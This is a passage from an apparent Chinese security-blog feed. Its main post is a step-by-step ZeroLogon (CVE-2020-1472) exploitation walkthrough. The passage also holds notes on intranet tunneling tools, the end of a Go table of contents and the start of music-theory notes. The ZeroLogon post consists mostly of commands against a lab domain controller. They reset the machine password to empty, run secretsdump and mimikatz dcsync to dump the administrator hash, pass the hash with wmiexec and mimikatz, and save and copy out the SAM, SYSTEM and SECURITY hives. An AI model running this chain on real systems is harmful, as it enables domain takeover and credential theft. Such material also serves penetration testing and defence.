id="从-panic-中恢复（Recover）"><a href="#从-panic-中恢复（Recover）" class="headerlink" title="从 panic 中恢复（Recover）"></a>从 panic 中恢复（Recover）</h3><h3 id="自定义包中的错误处理和-panicking"><a href="#自定义包中的错误处理和-panicking" class="headerlink" title="自定义包中的错误处理和 panicking"></a>自定义包中的错误处理和 panicking</h3><h3 id="一种用闭包处理错误的模式"><a href="#一种用闭包处理错误的模式" class="headerlink" title="一种用闭包处理错误的模式"></a>一种用闭包处理错误的模式</h3><h3 id="启动外部命令和程序"><a href="#启动外部命令和程序" class="headerlink" title="启动外部命令和程序"></a>启动外部命令和程序</h3><h3 id="Go-中的单元测试和基准测试"><a href="#Go-中的单元测试和基准测试" class="headerlink" title="Go 中的单元测试和基准测试"></a>Go 中的单元测试和基准测试</h3><h3 id="测试的具体例子"><a href="#测试的具体例子" class="headerlink" title="测试的具体例子"></a>测试的具体例子</h3><h3 id="用（测试数据）表驱动测试"><a href="#用（测试数据）表驱动测试" class="headerlink" title="用（测试数据）表驱动测试"></a>用（测试数据）表驱动测试</h3><h3 id="性能调试：分析并优化"><a href="#性能调试：分析并优化" class="headerlink" title="性能调试：分析并优化"></a>性能调试：分析并优化</h3><h2 id="协程（goroutine）与通道（channel）"><a href="#协程（goroutine）与通道（channel）" class="headerlink" title="协程（goroutine）与通道（channel）"></a>协程（goroutine）与通道（channel）</h2><h3 id="并发、并行和协程"><a href="#并发、并行和协程" class="headerlink" title="并发、并行和协程"></a>并发、并行和协程</h3><h3 id="使用通道进行协程间通信"><a href="#使用通道进行协程间通信" class="headerlink" title="使用通道进行协程间通信"></a>使用通道进行协程间通信</h3><h3 id="协程同步：关闭通道-对阻塞的通道进行测试"><a href="#协程同步：关闭通道-对阻塞的通道进行测试" class="headerlink" title="协程同步：关闭通道-对阻塞的通道进行测试"></a>协程同步：关闭通道-对阻塞的通道进行测试</h3><h3 id="使用-select-切换协程"><a href="#使用-select-切换协程" class="headerlink" title="使用 select 切换协程"></a>使用 select 切换协程</h3><h3 id="通道，超时和计时器（Ticker）"><a href="#通道，超时和计时器（Ticker）" class="headerlink" title="通道，超时和计时器（Ticker）"></a>通道，超时和计时器（Ticker）</h3><h3 id="协程和恢复（recover）"><a href="#协程和恢复（recover）" class="headerlink" title="协程和恢复（recover）"></a>协程和恢复（recover）</h3><h2 id="网络、模版与网页应用"><a href="#网络、模版与网页应用" class="headerlink" title="网络、模版与网页应用"></a>网络、模版与网页应用</h2><h3 id="tcp服务器"><a href="#tcp服务器" class="headerlink" title="tcp服务器"></a>tcp服务器</h3><h3 id="一个简单的web服务器"><a href="#一个简单的web服务器" class="headerlink" title="一个简单的web服务器"></a>一个简单的web服务器</h3><h3 id="访问并读取页面数据"><a href="#访问并读取页面数据" class="headerlink" title="访问并读取页面数据"></a>访问并读取页面数据</h3><h3 id="写一个简单的网页应用"><a href="#写一个简单的网页应用" class="headerlink" title="写一个简单的网页应用"></a>写一个简单的网页应用</h3><h1 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h1><h2 id="常见的陷阱与错误"><a href="#常见的陷阱与错误" class="headerlink" title="常见的陷阱与错误"></a>常见的陷阱与错误</h2><h3 id="误用短声明导致变量覆盖"><a href="#误用短声明导致变量覆盖" class="headerlink" title="误用短声明导致变量覆盖"></a>误用短声明导致变量覆盖</h3><h3 id="误用字符串"><a href="#误用字符串" class="headerlink" title="误用字符串"></a>误用字符串</h3><h3 id="发生错误时使用defer关闭一个文件"><a href="#发生错误时使用defer关闭一个文件" class="headerlink" title="发生错误时使用defer关闭一个文件"></a>发生错误时使用defer关闭一个文件</h3><h3 id="不需要将一个指向切片的指针传递给函数"><a href="#不需要将一个指向切片的指针传递给函数" class="headerlink" title="不需要将一个指向切片的指针传递给函数"></a>不需要将一个指向切片的指针传递给函数</h3><h3 id="使用指针指向接口类型"><a href="#使用指针指向接口类型" class="headerlink" title="使用指针指向接口类型"></a>使用指针指向接口类型</h3><h3 id="使用值类型时误用指针"><a href="#使用值类型时误用指针" class="headerlink" title="使用值类型时误用指针"></a>使用值类型时误用指针</h3><h3 id="误用协程和通道"><a href="#误用协程和通道" class="headerlink" title="误用协程和通道"></a>误用协程和通道</h3><h3 id="闭包和协程的使用"><a href="#闭包和协程的使用" class="headerlink" title="闭包和协程的使用"></a>闭包和协程的使用</h3><h3 id="糟糕的错误处理"><a href="#糟糕的错误处理" class="headerlink" title="糟糕的错误处理"></a>糟糕的错误处理</h3><h2 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h2><h3 id="关于逗号ok模式"><a href="#关于逗号ok模式" class="headerlink" title="关于逗号ok模式"></a>关于逗号ok模式</h3><h2 id="出于性能考虑的实用代码片段"><a href="#出于性能考虑的实用代码片段" class="headerlink" title="出于性能考虑的实用代码片段"></a>出于性能考虑的实用代码片段</h2><h3 id="字符串-1"><a href="#字符串-1" class="headerlink" title="字符串"></a>字符串</h3><h3 id="数组和切片"><a href="#数组和切片" class="headerlink" title="数组和切片"></a>数组和切片</h3><h3 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h3><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><h3 id="协程（goroutine）与通道（channel）-1"><a href="#协程（goroutine）与通道（channel）-1" class="headerlink" title="协程（goroutine）与通道（channel）"></a>协程（goroutine）与通道（channel）</h3><h3 id="网络和网页应用"><a href="#网络和网页应用" class="headerlink" title="网络和网页应用"></a>网络和网页应用</h3><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h3 id="出于性能考虑的最佳实践和建议"><a href="#出于性能考虑的最佳实践和建议" class="headerlink" title="出于性能考虑的最佳实践和建议"></a>出于性能考虑的最佳实践和建议</h3>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;参考（Ctrl c+v） &lt;a href=&quot;https://www.kancloud.cn/kancloud/the-way-to-go/&quot;&gt;https://www.kancloud.cn/kancloud/the-way-to-go/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当个学习笔记，只记录重点。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang" scheme="https://www.se7ensec.cn/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|内网传输通道的建立</title>
    <link href="https://www.se7ensec.cn/2021/04/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BC%A0%E8%BE%93%E9%80%9A%E9%81%93%E7%9A%84%E5%BB%BA%E7%AB%8B/"/>
    <id>https://www.se7ensec.cn/2021/04/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BC%A0%E8%BE%93%E9%80%9A%E9%81%93%E7%9A%84%E5%BB%BA%E7%AB%8B/</id>
    <published>2021-04-03T14:10:24.000Z</published>
    <updated>2021-10-13T02:41:47.133Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>内网传输通道的建立。</p></blockquote><a id="more"></a><h1 id="判断是否出网"><a href="#判断是否出网" class="headerlink" title="判断是否出网"></a>判断是否出网</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ping : icmp</span><br><span class="line">curl : http </span><br><span class="line">nslookup : dns </span><br><span class="line">nc ip port : tcp</span><br></pre></td></tr></table></figure><p>内网渗透网络环境复杂且工具繁多，有时还要考虑免杀，理解了原理找到适合自己的即可，本文也不会过多写工具的使用，有空更新下使用命令~</p><h1 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>正向代理，意思是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端，客户端才能使用正向代理。</p><h2 id="使用情景"><a href="#使用情景" class="headerlink" title="使用情景"></a>使用情景</h2><blockquote><p><strong>注意：不需要公网的vps</strong></p></blockquote><p>1.目标主机拥有公网IP。</p><p> 常用工具：</p><p><a href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p><p><a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><p>2.目标主机存在WEB服务且不通外网，支持动态脚本PHP、ASPX、JSP。</p><p>常用工具：</p><p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><p><a href="https://github.com/FunnyWolf/pystinger">https://github.com/FunnyWolf/pystinger</a></p><p><a href="https://github.com/blackarrowsec/pivotnacci">https://github.com/blackarrowsec/pivotnacci</a></p><h1 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>反向代理服务器位于用户与目标服务器之间，但是对于用户而言，反向代理服务器就相当于目标服务器，即用户直接访问反向代理服务器就可以获得目标服务器的资源。</p><h2 id="使用情景-1"><a href="#使用情景-1" class="headerlink" title="使用情景"></a>使用情景</h2><blockquote><p><strong>注意：需要公网的vps</strong></p></blockquote><p>目标主机通外网即可。</p><p>常用工具：</p><p><a href="https://github.com/vzex/dog-tunnel">https://github.com/vzex/dog-tunnel</a></p><p><a href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p><p><a href="https://github.com/fatedier/frp/">https://github.com/fatedier/frp/</a></p><p><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><p><a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><h1 id="隔离网络之多级代理"><a href="#隔离网络之多级代理" class="headerlink" title="隔离网络之多级代理"></a>隔离网络之多级代理</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>内网渗透中，会遇到隔离网络，更多时候是逻辑上的隔离，突破的办法就是拿到route可达的跳板机 (多张网卡、运维机等)的权限，建立一层二级代理、三级代理…</p><blockquote><p><strong>注意：随机应变</strong></p></blockquote><p>常用工具：</p><p><a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><p><a href="https://github.com/ginuerzh/gost">https://github.com/ginuerzh/gost</a></p><p><a href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p><p><strong>还有一些windows【netsh】和linux【ssh】的自带程序的端口转发、icmp协议的流量转发没有写，不过一般也用不到，暂时先写这么多。</strong></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;内网传输通道的建立。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>域渗透|ZeroLogon的利用</title>
    <link href="https://www.se7ensec.cn/2021/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F-ZeroLogon%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>https://www.se7ensec.cn/2021/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F-ZeroLogon%E7%9A%84%E5%88%A9%E7%94%A8/</id>
    <published>2021-03-12T07:10:24.000Z</published>
    <updated>2021-09-01T15:53:17.245Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>CVE-2020-1472</p></blockquote><a id="more"></a><p><a href="https://www.anquanke.com/post/id/219374">https://www.anquanke.com/post/id/219374</a></p><p>文中提到一种办法，适用于其他办法<code>无法恢复</code>的情况</p><p><strong>脱域后，可以使用powershell来强制同步，一次性重置计算机的机器帐户密码。(包括AD，注册表，lsass里面的密码)。</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">Reset-ComputerMachinePassword</span></span><br></pre></td></tr></table></figure><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">域：AAAA.COM</span><br><span class="line">DC：LX<span class="literal">-DC01</span>.AAAA.COM &lt;<span class="literal">-ip</span>-&gt; <span class="number">192.168</span>.<span class="number">1.4</span></span><br></pre></td></tr></table></figure><h2 id="python版本"><a href="#python版本" class="headerlink" title="python版本"></a>python版本</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p><a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 zerologon_tester.py LX<span class="literal">-DC01</span> <span class="number">192.168</span>.<span class="number">1.4</span> </span><br></pre></td></tr></table></figure><h3 id="安装impacket"><a href="#安装impacket" class="headerlink" title="安装impacket"></a>安装impacket</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket.git</span><br><span class="line"><span class="built_in">cd</span> impacket &amp;&amp; pip3 install .</span><br></pre></td></tr></table></figure><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p><a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a> - set_empty_pw.py</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 set_empty_pw.py LX<span class="literal">-DC01</span> <span class="number">192.168</span>.<span class="number">1.4</span> </span><br></pre></td></tr></table></figure><h3 id="获取域管administrator的hash"><a href="#获取域管administrator的hash" class="headerlink" title="获取域管administrator的hash"></a>获取域管administrator的hash</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py AAAA.COM/LX<span class="literal">-DC01</span>\<span class="variable">$</span>@<span class="number">192.168</span>.<span class="number">1.4</span> <span class="literal">-no</span><span class="literal">-pass</span></span><br></pre></td></tr></table></figure><h3 id="通过wmiexec使用-“administrator”的hash获取域管权限"><a href="#通过wmiexec使用-“administrator”的hash获取域管权限" class="headerlink" title="通过wmiexec使用 “administrator”的hash获取域管权限"></a>通过wmiexec使用 “administrator”的hash获取域管权限</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py <span class="literal">-hashes</span> :be833ac3f39c0f843b1b653d37c34dbe AAAA.COM/administrator@<span class="number">192.168</span>.<span class="number">1.4</span> </span><br></pre></td></tr></table></figure><h4 id="获取目标原始hash"><a href="#获取目标原始hash" class="headerlink" title="获取目标原始hash"></a>获取目标原始hash</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br></pre></td></tr></table></figure><h4 id="将导出的hash文件下载到本地"><a href="#将导出的hash文件下载到本地" class="headerlink" title="将导出的hash文件下载到本地"></a>将导出的hash文件下载到本地</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br></pre></td></tr></table></figure><p><strong>坑点：这一步有可能python出现编码错误导致不能下载</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">不同语言的编码不同，可以先获取下语言然后搜对应编码</span><br><span class="line">https:&#x2F;&#x2F;docs.python.org&#x2F;3&#x2F;library&#x2F;codecs.html</span><br><span class="line">指定下编码</span><br><span class="line">python3 wmiexec.py -hashes :be833ac3f39c0f843b1b653d37c34dbe AAAA.COM&#x2F;administrator@192.168.1.4 -codec gb2312</span><br></pre></td></tr></table></figure><p><strong>也可使用net use将文件copy回来</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mimi注入hash到cmd</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:AAAA /ntlm:be833ac3f39c0f843b1b653d37c34dbe</span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">1.4</span></span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192.168</span>.<span class="number">1.4</span>\c<span class="variable">$</span>\system.save c:\system.save</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192.168</span>.<span class="number">1.4</span>\c<span class="variable">$</span>\sam.save c:\sam.save</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192.168</span>.<span class="number">1.4</span>\c<span class="variable">$</span>\security.save c:\security.save</span><br></pre></td></tr></table></figure><h4 id="在域控主机上删除导出的hash文件。"><a href="#在域控主机上删除导出的hash文件。" class="headerlink" title="在域控主机上删除导出的hash文件。"></a>在域控主机上删除导出的hash文件。</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">del</span> /f system.save</span><br><span class="line"><span class="built_in">del</span> /f sam.save</span><br><span class="line"><span class="built_in">del</span> /f security.save</span><br></pre></td></tr></table></figure><h3 id="使用secretsdump读取下载到本地的hash文件-获取域控机器账户置空前的原始hash"><a href="#使用secretsdump读取下载到本地的hash文件-获取域控机器账户置空前的原始hash" class="headerlink" title="使用secretsdump读取下载到本地的hash文件,获取域控机器账户置空前的原始hash"></a>使用secretsdump读取下载到本地的hash文件,获取域控机器账户置空前的原始hash</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py <span class="literal">-sam</span> sam.save <span class="literal">-system</span> system.save <span class="literal">-security</span> security.save LOCAL</span><br></pre></td></tr></table></figure><h3 id="密码恢复"><a href="#密码恢复" class="headerlink" title="密码恢复"></a>密码恢复</h3><p><strong>建议使用：</strong></p><blockquote><p>脚本有可能会缺少xxx包导致报错，还没整明白啥原因</p></blockquote><p><a href="https://github.com/mstxq17/cve-2020-1472">https://github.com/mstxq17/cve-2020-1472</a> - restorepassword.py</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 restorepassword.py aaaa.com/LX<span class="literal">-DC01</span>@LX<span class="literal">-DC01</span> <span class="literal">-target</span><span class="literal">-ip</span> <span class="number">192.168</span>.<span class="number">1.4</span> <span class="literal">-hexpass</span> <span class="number">87</span>e2812ccea41210c80e298c9e2a43a249d6a4056027787774340fbfd4b5f969563803b0f1bae7ccd24b29b41ae611025f1952793562d73e7f4e0f8938b3361332b35dd5ee22785b79b922149db32dc5c9301f4fd9fd090f532575bf5197a9c9230955bfd96ab928ae66b3999730c75b8545e26770816f21f2dbf9dbb19432211a91224c4c618507f7091ae09435a13a04bad5f056e72d34a96f67fa33d50e7596eca7709f398d98ba9e07407d7b2e4b937e40d1bf5ff0eb2240bdf0e8287e26ea5f8e69219fa7b1c5aa0e0bd8b992a176c32b0efb914fa6c1e53d69179110b02dfc1b1a0e53b445b92588420af18960</span><br></pre></td></tr></table></figure><p><del><strong>不建议使用：</strong></del></p><blockquote><p>比较暴力，会再打一次，计算密码的时候使用了空密码的hash去计算session_key</p></blockquote><p><a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a> - reinstall_original_pw.py</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH</span><br></pre></td></tr></table></figure><h2 id="mimikatz版本"><a href="#mimikatz版本" class="headerlink" title="mimikatz版本"></a>mimikatz版本</h2><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Intel\mimikatz.exe <span class="string">&quot;lsadump::zerologon /target:192.168.1.4 /account:LX-DC01<span class="variable">$</span>&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon /target:<span class="number">192.168</span>.<span class="number">1.4</span> /account:LX<span class="literal">-DC01</span><span class="variable">$</span></span><br></pre></td></tr></table></figure><h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Intel\mimikatz.exe <span class="string">&quot;lsadump::zerologon /target:LX-DC01.AAAA.COM /account:LX-DC01<span class="variable">$</span> /exploit&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon /target:LX<span class="literal">-DC01</span>.AAAA.COM /account:LX<span class="literal">-DC01</span><span class="variable">$</span> /exploit</span><br></pre></td></tr></table></figure><h3 id="获取域管administrator的hash-1"><a href="#获取域管administrator的hash-1" class="headerlink" title="获取域管administrator的hash"></a>获取域管administrator的hash</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Intel\mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:AAAA.COM /dc:LX-DC01.AAAA.COM /user:administrator /authuser:LX-DC01<span class="variable">$</span> /authdomain:AAAA /authpassword: /authntlm&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:AAAA.COM /dc:LX<span class="literal">-DC01</span>.AAAA.COM /user:administrator /authuser:LX<span class="literal">-DC01</span><span class="variable">$</span> /authdomain:AAAA /authpassword: /authntlm</span><br></pre></td></tr></table></figure><h3 id="hash-注入起一个域管cmd"><a href="#hash-注入起一个域管cmd" class="headerlink" title="hash 注入起一个域管cmd"></a>hash 注入起一个域管cmd</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Intel\mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:administrator /domain:AAAA /ntlm:be833ac3f39c0f843b1b653d37c34dbe&quot;</span> <span class="string">&quot;exit</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:AAAA /ntlm:be833ac3f39c0f843b1b653d37c34dbe</span><br></pre></td></tr></table></figure><h3 id="通过域管cmd，恢复域控机器账户密码"><a href="#通过域管cmd，恢复域控机器账户密码" class="headerlink" title="通过域管cmd，恢复域控机器账户密码"></a>通过域管cmd，恢复域控机器账户密码</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Intel\mimikatz.exe <span class="string">&quot;lsadump::postzerologon /target:192.168.1.4 /account:LX-DC01<span class="variable">$</span>&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::postzerologon /target:<span class="number">192.168</span>.<span class="number">1.4</span> /account:LX<span class="literal">-DC01</span><span class="variable">$</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;CVE-2020-1472&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="域渗透" scheme="https://www.se7ensec.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>乐理基础学习笔记</title>
    <link href="https://www.se7ensec.cn/2021/03/04/%E4%B9%90%E7%90%86%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.se7ensec.cn/2021/03/04/%E4%B9%90%E7%90%86%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-03-03T17:16:18.000Z</published>
    <updated>2021-03-12T14:01:35.751Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>乐理基础学习笔记。</p></blockquote><a id="more"></a><h1 id="节奏"><a href="#节奏" class="headerlink" title="节奏"></a>节奏</h1><h2 id="拍"><a href="#拍" class="headerlink" title="拍"></a>拍</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通常底鼓每响一次则为一拍，一拍就是音乐中用来定义音的长度的单位，但是根据曲作者的要求，这个基本单位的时长也是可以变化的。</span><br><span class="line">比如作者规定一分钟60拍，那么一拍就是1秒。</span><br></pre></td></tr></table></figure><h2 id="速度"><a href="#速度" class="headerlink" title="速度"></a>速度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bpm - beats per minute &#123;每分钟多少拍&#125;</span><br></pre></td></tr></table></figure><h2 id="小节"><a href="#小节" class="headerlink" title="小节"></a>小节</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">于小节的概念你可以这么理解，它就像是你写一个曲子最基本的节奏循环单位。比如圆舞曲，很多都是三拍子的，所以跳起舞来可以有一哒哒，二哒哒，三哒哒，这样的感觉。这就是节奏的意思了。</span><br><span class="line">所以一个小节，就是规定我这个曲子是按怎么样的节奏在演奏着，是哒哒哒，哒哒哒，还是哒哒哒哒，哒哒哒哒。</span><br></pre></td></tr></table></figure><h2 id="节拍"><a href="#节拍" class="headerlink" title="节拍"></a>节拍</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通常音乐大部分为4&#x2F;4拍</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303224319162.png"></p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303224747561.png"></p><h2 id="音符时值"><a href="#音符时值" class="headerlink" title="音符时值"></a>音符时值</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">全音符、二分音符、四分音符（时间长度 &#x3D; 一拍）</span><br></pre></td></tr></table></figure><h1 id="钢琴键盘"><a href="#钢琴键盘" class="headerlink" title="钢琴键盘"></a>钢琴键盘</h1><h2 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303232256798.png"></p><h2 id="升降"><a href="#升降" class="headerlink" title="升降"></a>升降</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303232519187.png"></p><h2 id="中央C-C5"><a href="#中央C-C5" class="headerlink" title="中央C = C5"></a>中央C = C5</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303232704056.png"></p><h1 id="调-diao-是啥"><a href="#调-diao-是啥" class="headerlink" title="调(diào)是啥"></a>调(diào)是啥</h1><h2 id="大调"><a href="#大调" class="headerlink" title="大调"></a>大调</h2><h3 id="C大调"><a href="#C大调" class="headerlink" title="C大调"></a>C大调</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303232914629.png"></p><h3 id="D大调"><a href="#D大调" class="headerlink" title="D大调"></a>D大调</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303232953859.png"></p><h3 id="…"><a href="#…" class="headerlink" title="…"></a>…</h3><h2 id="升、降号调"><a href="#升、降号调" class="headerlink" title="升、降号调"></a>升、降号调</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303233103609.png"></p><h2 